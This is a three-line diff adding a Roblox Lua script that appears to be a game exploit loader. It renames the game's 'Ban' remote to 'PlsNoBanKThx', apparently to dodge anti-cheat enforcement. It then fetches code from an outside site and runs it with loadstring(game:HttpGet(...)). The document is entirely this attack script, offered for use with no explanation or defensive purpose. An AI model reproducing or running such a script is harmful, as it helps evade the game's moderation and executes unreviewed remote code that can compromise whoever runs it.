@@ -1,0 +1,3 @@
+if game.ReplicatedStorage.Interaction:FindFirstChild("Ban") then
+    game.ReplicatedStorage.Interaction:FindFirstChild("Ban").Name = "PlsNoBanKThx"end
+loadstring(game:HttpGet("https://ancestordeveloment.wtf/Ancestor/"))()
